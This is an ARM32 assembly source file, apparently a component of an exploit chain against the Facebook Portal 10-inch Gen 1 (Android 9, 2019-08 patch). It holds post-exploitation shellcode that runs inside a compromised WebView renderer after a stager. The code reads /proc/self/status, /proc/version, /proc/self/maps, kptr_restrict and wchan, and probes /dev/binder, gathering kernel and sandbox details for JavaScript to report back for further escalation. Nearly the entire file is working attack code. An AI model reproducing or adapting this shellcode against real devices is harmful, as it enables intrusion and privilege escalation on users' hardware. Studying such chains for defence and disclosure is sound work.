/*
 * recon_procfs.s — Kernel recon shellcode via /proc reads
 * ARM32 EABI shellcode for Facebook Portal captive portal WebView
 *
 * Target: Portal 10" Gen 1 (aloha), APQ8098/SD835
 *         Kernel 4.4.153, Android 9, security patch 2019-08-01
 *
 * Reads /proc files from the renderer process to gather intelligence:
 *   1. /proc/self/status   → UID, GID, seccomp, capabilities
 *   2. /proc/version        → exact kernel version string
 *   3. /dev/binder          → check if accessible (open test)
 *   4. /proc/self/maps (first 4KB) → memory layout
 *
 * Data goes into wasm_mem at known offsets; JS reads and reports.
 *
 * Entry: R4 = wasm_mem (loaded by mprotect_jump stager)
 *
 * Memory layout (offsets from wasm_mem):
 *   +0x0000..0x03FF: shellcode (max 1024 bytes)
 *   +0x0400..0x04FF: string constants (file paths)
 *   +0x1400..0x143F: results header (16 words)
 *   +0x2000..0x2FFF: /proc/self/status data (4KB)
 *   +0x3000..0x3FFF: /proc/version data (4KB)
 *   +0x4000..0x4FFF: /proc/self/maps data (4KB)
 *   +0x5000..0x5FFF: /proc/self/wchan + /proc/sys/... data
 *
 * Results header (wasm_mem + 0x1400):
 *   [+0x00] magic = 0xDDDD0001
 *   [+0x04] status_len     (bytes read from /proc/self/status)
 *   [+0x08] version_len    (bytes read from /proc/version)
 *   [+0x0C] binder_fd      (fd from open(/dev/binder) or -errno)
 *   [+0x10] maps_len       (bytes read from /proc/self/maps)
 *   [+0x14] uid            (getuid32 result)
 *   [+0x18] pid            (getpid result)
 *   [+0x1C] kptr_restrict  (value from /proc/sys/kernel/kptr_restrict)
 *   [+0x20] wchan_len      (bytes read from /proc/self/wchan)
 *   [+0x24] seccomp_status (read from /proc/self/status, parsed)
 *   [+0x28] reserved
 *   [+0x2C] final_status   (0xDD01 = success)
 *
 * Return: 0xDDxx status code
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

/* Syscall numbers (ARM32 EABI) */
.equ NR_exit,     1
.equ NR_read,     3
.equ NR_write,    4
.equ NR_open,     5
.equ NR_close,    6
.equ NR_getpid,   20
.equ NR_getuid32, 199

.equ O_RDONLY, 0
.equ O_RDWR,   2

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #16         /* small scratch frame */
    mov     r10, r4             /* R10 = wasm_mem */
    add     r11, r10, #0x1400   /* R11 = results header */

    /* Write magic */
    movw    r0, #0x0001
    movt    r0, #0xDDDD
    str     r0, [r11]           /* results.magic */

    /* ─── Get basic info ─── */

    /* getuid32 */
    mov     r7, #NR_getuid32
    svc     #0
    str     r0, [r11, #0x14]    /* results.uid */

    /* getpid */
    mov     r7, #NR_getpid
    svc     #0
    str     r0, [r11, #0x18]    /* results.pid */

    /* ─── Read /proc/self/status ─── */

    /* Build path string at wasm_mem + 0x0400 */
    /* "/proc/self/status\0" = 18 bytes */
    add     r0, r10, #0x400
    ldr     r1, =0x6F72702F    /* "/pro" */
    str     r1, [r0]
    ldr     r1, =0x65732F63    /* "c/se" */
    str     r1, [r0, #4]
    ldr     r1, =0x732F666C    /* "lf/s" */
    str     r1, [r0, #8]
    ldr     r1, =0x75746174    /* "tatu" */
    str     r1, [r0, #12]
    ldr     r1, =0x00000073    /* "s\0" */
    str     r1, [r0, #16]

    /* open("/proc/self/status", O_RDONLY) */
    add     r0, r10, #0x400
    mov     r1, #O_RDONLY
    mov     r7, #NR_open
    svc     #0
    cmp     r0, #0
    blt     status_fail
    mov     r8, r0              /* r8 = fd */

    /* read(fd, wasm_mem + 0x2000, 4095) */
    mov     r0, r8
    add     r1, r10, #0x2000
    movw    r2, #4095
    mov     r7, #NR_read
    svc     #0
    cmp     r0, #0
    movlt   r0, #0
    str     r0, [r11, #0x04]    /* results.status_len */

    /* null terminate */
    add     r1, r10, #0x2000
    add     r1, r1, r0
    mov     r2, #0
    strb    r2, [r1]

    /* close */
    mov     r0, r8
    mov     r7, #NR_close
    svc     #0
    b       read_version

status_fail:
    str     r0, [r11, #0x04]    /* store error */

    /* ─── Read /proc/version ─── */
read_version:
    /* Build "/proc/version\0" at wasm_mem + 0x0420 */
    add     r0, r10, #0x420
    ldr     r1, =0x6F72702F    /* "/pro" */
    str     r1, [r0]
    ldr     r1, =0x65762F63    /* "c/ve" */
    str     r1, [r0, #4]
    ldr     r1, =0x6F697372    /* "rsio" */
    str     r1, [r0, #8]
    ldr     r1, =0x0000006E    /* "n\0" */
    str     r1, [r0, #12]

    add     r0, r10, #0x420
    mov     r1, #O_RDONLY
    mov     r7, #NR_open
    svc     #0
    cmp     r0, #0
    blt     version_fail
    mov     r8, r0

    mov     r0, r8
    add     r1, r10, #0x3000
    movw    r2, #4095
    mov     r7, #NR_read
    svc     #0
    cmp     r0, #0
    movlt   r0, #0
    str     r0, [r11, #0x08]    /* results.version_len */

    /* null terminate */
    add     r1, r10, #0x3000
    add     r1, r1, r0
    mov     r2, #0
    strb    r2, [r1]

    mov     r0, r8
    mov     r7, #NR_close
    svc     #0
    b       check_binder

version_fail:
    str     r0, [r11, #0x08]

    /* ─── Check /dev/binder access ─── */
check_binder:
    /* Build "/dev/binder\0" at wasm_mem + 0x0440 */
    add     r0, r10, #0x440
    ldr     r1, =0x7665642F    /* "/dev" */
    str     r1, [r0]
    ldr     r1, =0x6E69622F    /* "/bin" */
    str     r1, [r0, #4]
    ldr     r1, =0x00726564    /* "der\0" */
    str     r1, [r0, #8]

    add     r0, r10, #0x440
    mov     r1, #O_RDWR
    mov     r7, #NR_open
    svc     #0
    str     r0, [r11, #0x0C]   /* results.binder_fd (fd or -errno) */
    cmp     r0, #0
    blt     read_maps
    /* Close binder fd if successfully opened */
    mov     r7, #NR_close
    svc     #0

    /* ─── Read /proc/self/maps ─── */
read_maps:
    /* Build "/proc/self/maps\0" at wasm_mem + 0x0460 */
    add     r0, r10, #0x460
    ldr     r1, =0x6F72702F    /* "/pro" */
    str     r1, [r0]
    ldr     r1, =0x65732F63    /* "c/se" */
    str     r1, [r0, #4]
    ldr     r1, =0x6D2F666C    /* "lf/m" */
    str     r1, [r0, #8]
    ldr     r1, =0x00737061    /* "aps\0" */
    str     r1, [r0, #12]

    add     r0, r10, #0x460
    mov     r1, #O_RDONLY
    mov     r7, #NR_open
    svc     #0
    cmp     r0, #0
    blt     maps_fail
    mov     r8, r0

    mov     r0, r8
    add     r1, r10, #0x4000
    movw    r2, #4095
    mov     r7, #NR_read
    svc     #0
    cmp     r0, #0
    movlt   r0, #0
    str     r0, [r11, #0x10]   /* results.maps_len */

    /* null terminate */
    add     r1, r10, #0x4000
    add     r1, r1, r0
    mov     r2, #0
    strb    r2, [r1]

    mov     r0, r8
    mov     r7, #NR_close
    svc     #0
    b       read_kptr

maps_fail:
    str     r0, [r11, #0x10]

    /* ─── Read /proc/sys/kernel/kptr_restrict ─── */
read_kptr:
    /* Build path at wasm_mem + 0x0480 */
    /* "/proc/sys/kernel/kptr_restrict\0" */
    add     r0, r10, #0x480
    ldr     r1, =0x6F72702F    /* "/pro" */
    str     r1, [r0]
    ldr     r1, =0x79732F63    /* "c/sy" */
    str     r1, [r0, #4]
    ldr     r1, =0x656B2F73    /* "s/ke" */
    str     r1, [r0, #8]
    ldr     r1, =0x6C656E72    /* "rnel" */
    str     r1, [r0, #12]
    ldr     r1, =0x74706B2F    /* "/kpt" */
    str     r1, [r0, #16]
    ldr     r1, =0x65725F72    /* "r_re" */
    str     r1, [r0, #20]
    ldr     r1, =0x69727473    /* "stri" */
    str     r1, [r0, #24]
    ldr     r1, =0x00007463    /* "ct\0" */
    str     r1, [r0, #28]

    add     r0, r10, #0x480
    mov     r1, #O_RDONLY
    mov     r7, #NR_open
    svc     #0
    cmp     r0, #0
    blt     kptr_fail
    mov     r8, r0

    /* Read into scratch on stack */
    mov     r0, r8
    add     r1, sp, #0
    mov     r2, #15
    mov     r7, #NR_read
    svc     #0

    /* Parse first byte as digit */
    cmp     r0, #0
    ble     kptr_parse_fail
    ldrb    r1, [sp]
    sub     r1, r1, #0x30       /* '0' = 0x30 */
    str     r1, [r11, #0x1C]    /* results.kptr_restrict */
    b       kptr_close

kptr_parse_fail:
    mvn     r0, #0              /* -1 */
    str     r0, [r11, #0x1C]
kptr_close:
    mov     r0, r8
    mov     r7, #NR_close
    svc     #0
    b       read_wchan

kptr_fail:
    str     r0, [r11, #0x1C]

    /* ─── Read /proc/self/wchan ─── */
read_wchan:
    /* Build "/proc/self/wchan\0" at wasm_mem + 0x04A0 */
    add     r0, r10, #0x4A0
    ldr     r1, =0x6F72702F    /* "/pro" */
    str     r1, [r0]
    ldr     r1, =0x65732F63    /* "c/se" */
    str     r1, [r0, #4]
    ldr     r1, =0x772F666C    /* "lf/w" */
    str     r1, [r0, #8]
    ldr     r1, =0x6E616863    /* "chan" */
    str     r1, [r0, #12]
    mov     r1, #0
    str     r1, [r0, #16]

    add     r0, r10, #0x4A0
    mov     r1, #O_RDONLY
    mov     r7, #NR_open
    svc     #0
    cmp     r0, #0
    blt     wchan_fail
    mov     r8, r0

    mov     r0, r8
    add     r1, r10, #0x5000
    mov     r2, #255
    mov     r7, #NR_read
    svc     #0
    cmp     r0, #0
    movlt   r0, #0
    str     r0, [r11, #0x20]    /* results.wchan_len */

    /* null terminate */
    add     r1, r10, #0x5000
    add     r1, r1, r0
    mov     r2, #0
    strb    r2, [r1]

    mov     r0, r8
    mov     r7, #NR_close
    svc     #0
    b       done_ok

wchan_fail:
    str     r0, [r11, #0x20]

done_ok:
    movw    r0, #0xDD01
    str     r0, [r11, #0x2C]    /* final_status = 0xDD01 (success) */
    b       done

done:
    ldr     r0, [r11, #0x2C]    /* return status */
    add     sp, sp, #16
    pop     {r4-r11, pc}
